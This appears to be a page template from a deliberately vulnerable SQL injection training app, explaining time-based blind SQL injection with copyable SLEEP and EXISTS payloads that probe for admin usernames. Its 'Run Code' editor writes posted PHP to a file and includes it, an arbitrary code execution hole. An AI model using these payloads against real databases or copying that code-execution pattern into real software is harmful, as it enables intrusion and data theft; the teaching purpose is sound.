<?php

$server_var = session('server');
$username_var = session('username');
$password_var = session('password');
$db_var = session('db');

$code = file_get_contents('code_templates/sqli_blind/sqli_tb_bn.php');

$output = "";

if (isset($_POST["code"])) {

    $code = $_POST["code"];

    $myfile = fopen("code.php", "w") ;

    fwrite($myfile, $code);

    ob_start();

    include 'code.php';

    $output = ob_get_contents();

    ob_end_clean();

    unlink("code.php");

}

?>

@include('layouts.navigation')

<div class="main">

    <div class="row">
        
        <div class="editor_column">

        <h3 style="margin: 0px 0px 10px 0px;">Time-Based SQLi</h3>

        <p>We'll be focusing on line <b>10</b> and <b>12</b>. </p>
        <p>For line <b>10</b>, the data is stored on the variable <b style="font-family: Courier;">$id</b>. This variable should be properly validated, ensuring that (in this case) only numbers are allowed to be handled, any other form of data is ought to be rejected.</p>
        <p>Moving on to line <b>12</b> the <b style="font-family: Courier;">$id</b> variable which handles the data is directly embedded in the SQL query, this is considered a bad practice as attackers have direct control and can manipulate the SQL directly before it is sent to the database. </p>
 
        <p>Let's analyse how the earlier attack's work. These are the payload's used (You can copy the payload below and paste it in the value of the <b style="font-family: Courier;">$id</b> variable at line <b>10</b>):</p>
        
        <b>Using the IF Operator</b>

        <p>The syntax of an if statement is:</p>

        <p class="code_space">IF(<span style="color:red;">condition</span>, <span style="color:red;">value_if_true</span>, <span style="color:red;">value_if_false</span>)</p>

        <ul style="list-style-type:disc; line-height: 30px;">

        <li><p><span class="code_space"><span style="color:red">condition</span></span> The query to run  </p></li>
        <li><p><span class="code_space"><span style="color:red">value_if_true</span></span> Specify what happens when the query is true. </p></li>
        <li><p><span class="code_space"><span style="color:red">value_if_false</span></span> Specify what happens when the query is false.</p></li>

        </ul>

        <p>The payloads used at the front-end was:</p>
        
        <ol id="list">

        <li><span class="code_space">1 AND IF(1=1, SLEEP(5), SLEEP(0))</span> <button class="buttons" onclick="copyTextOne()">Copy</button></li>
        <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
        <p class="code_space"><span style="color:purple;">SELECT</span> id, name, country <span style="color:purple;">FROM</span> products <span style="color:purple;">WHERE</span> id <span style="color:deeppink"> = </span><span style="color:green;">1</span> <span style="color:purple;">AND IF</span> ( </span><span style="color:green;">1</span> <span style="color:deeppink;">=</span> <span style="color:green;">1</span>,SLEEP(<span style="color:green;">5</span>), SLEEP(<span style="color:green;">0));</p>



        <p>In this case, the attacker request that if the condition 1 = 1 is true, wait for 5 seconds then execute otherwise just execute. An attacker can now attempt to map out the database based on the different queries it provides and the time it takes to execute it.</p>
        <p class="code_space">SELECT id, name, country FROM products WHERE id = 1 AND IF(<span style="color:red;">1 = 1</span>, <span style="color:red;">SLEEP(5)</span>, <span style="color:red;">SLEEP(0)</span>)</p>

        </ol>
        <b>Using the IF and EXISTS Operator</b>

        <p>The following payloads are using the EXISTS Operator along with the IF Operator, the syntax of the EXISTS command are as of the following:</p>

        <p class="code_space">EXISTS(<span style="color: red;">query</span>)</p>

            <ul>
            <li><p><span class="code_space"><span style="color:red">query</span></span> SQL query is specified here</p></li>
            </ul>
            <p>The function returns 1 (TRUE) if the query returns an entry, otherwise 0 (FALSE).</p>
            <p>The payloads used for this was:</p>

        <ol>

        <li><div class="code_space">1 AND IF(EXISTS(SELECT * FROM users WHERE username ='admin'), SLEEP(5), SLEEP(0))</div> <div style="padding: 5px;"></div> <button class="buttons" onclick="copyTextTwo()">Copy</button></li>
        <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
        <p class="code_space"><span style="color: purple;">SELECT</span> id, name, country <span style="color: purple;">FROM</span> products <span style="color: purple;">WHERE</span> id <span style="color: deeppink;">=</span> <span style="color: green;">1</span> <span style="color: purple;">AND</span> <span style="color: purple;">IF</span>(<span style="color: purple;">EXISTS</span>(<span style="color: purple;">SELECT</span> <span style="color: deeppink;">*</span> <span style="color: purple;">FROM</span> users <span style="color: purple;">WHERE</span> username <span style="color: deeppink;">=</span><span style="color: brown;">'admin'</span>), <span style="color: purple;">SLEEP</span>(<span style="color: green;">5</span>), <span style="color: purple;">SLEEP</span>(<span style="color: green;">0</span>))</p>
        <p>SQL will run this command and check that if the username 'admin' exist in the username, if true, wait for 5 seconds else just execute.</p>
        <p class="code_space">SELECT id, name, country FROM products WHERE id = 1 AND IF (<span style="color: red;">EXISTS (SELECT * FROM users WHERE username ='admin')</span>, <span style="color: red;">SLEEP(5)</span>, <span style="color: red;">SLEEP(0)</span>)</p>
        <p>In our case, the attacker is unable to find the user with the username admin, so the query now looks like:</p>
        <p class="code_space">SELECT id, name, country FROM products WHERE id = 1 AND IF (<span style="color: red;">0</span>, SLEEP(5), <span style="color: red;">SLEEP(0)</span>)</p>
        <p>Since the EXISTS function is unable to find the user with the username admin, it will return 0 (FALSE) which means the false value "SLEEP(0)" will run.</p>


        <br>
        
        <li><div class="code_space">1 AND IF(EXISTS(SELECT * FROM users WHERE username ='administrator'), SLEEP(5), SLEEP(0))</div> <div style="padding: 5px;"></div> <button class="buttons" onclick="copyTextThree()">Copy</button></li>
        <p>When the payload is replaced with the <b style="font-family: Courier;">$id</b> variable, it will look like this:</p>
        <p class="code_space"><span style="color: purple;">SELECT</span> id, name, country <span style="color: purple;">FROM</span> products <span style="color: purple;">WHERE</span> id <span style="color: deeppink;">=</span> <span style="color: green;">1</span> <span style="color: purple;">AND</span> <span style="color: purple;">IF</span>(<span style="color: purple;">EXISTS</span>(<span style="color: purple;">SELECT</span> <span style="color: deeppink;">*</span> <span style="color: purple;">FROM</span> users <span style="color: purple;">WHERE</span> username <span style="color: deeppink;">=</span><span style="color: brown;">'administrator'</span>), <span style="color: purple;">SLEEP</span>(<span style="color: green;">5</span>), <span style="color: purple;">SLEEP</span>(<span style="color: green;">0</span>))</p>
        <p>SQL will run this command and check that if the username 'administrator' exist in the username, if true, wait for 5 seconds else just execute.</p>
        <p class="code_space">SELECT id, name, country FROM products WHERE id = 1 AND IF (<span style="color: red;">EXISTS (SELECT * FROM users WHERE username ='administrator')</span>, <span style="color: red;">SLEEP(5)</span>, <span style="color: red;">SLEEP(0)</span>)</p>
        <p>In our case, the attacker is able to find the user with the username administrator, so the query now looks like:</p>
        <p class="code_space">SELECT id, name, country FROM products WHERE id = 1 AND IF (<span style="color: red;">1</span>, <span style="color: red;"> SLEEP(5)</span>, SLEEP(0))</p>
        <p>Since the EXISTS function is able to find the user with the username administrator, it will return 1 (TRUE) which means the true value "SLEEP(5)" will run.</p>
        </ol>

        <a href="{{route('blind_time_front_end')}}"><button class="buttons">View Time-Based attack front-end</button></a>
        
        </div>

        <div class="output_column code_font">

        
        <div class="output_result">

        <?php echo $output; ?> 

        </div>

        <br>


        <form method="post">
            @csrf
            <input type="submit" value="Run Code >" class="buttons">
            <br>
            <br>
            <textarea id="code" name="code"><?php echo $code; ?></textarea>
            <br>

        </form>
        
    </div>
 
    <script>
        var editor = CodeMirror.fromTextArea(document.getElementById("code"), {
            lineNumbers: true,
            matchBrackets: true,
            mode: "application/x-httpd-php",
            indentUnit: 4,
            indentWithTabs: true,
            theme: "ayu-dark"
        });

        editor.setSize(null, '1950px'); 


        function copyTextOne() {
            var copyText = "1 AND IF(1=1, SLEEP(5), SLEEP(0))";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextTwo() {
            var copyText = "1 AND IF(EXISTS(SELECT * FROM users WHERE username ='admin'), SLEEP(5), SLEEP(0))";
            navigator.clipboard.writeText(copyText);
        }

        function copyTextThree() {
            var copyText = "1 AND IF(EXISTS(SELECT * FROM users WHERE username ='administrator'), SLEEP(5), SLEEP(0))";
            navigator.clipboard.writeText(copyText);
        }
    </script>

</div>


